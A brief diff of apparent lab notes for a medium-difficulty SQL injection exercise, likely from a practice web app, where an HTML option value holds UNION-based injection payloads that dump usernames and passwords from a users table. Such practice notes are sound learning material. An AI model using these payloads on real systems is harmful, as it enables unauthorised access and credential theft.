@@ -23,9 +23,7 @@ User Id -->
 
 
 # SQLi - Difficulty:Medium
-inspect-->
-
-User Id
+inspect--> User Id
 
 
 <option value="1 or 1=1 UNION SELECT user, password FROM users#">' UNION SELECT username, password FROM users--1</option>
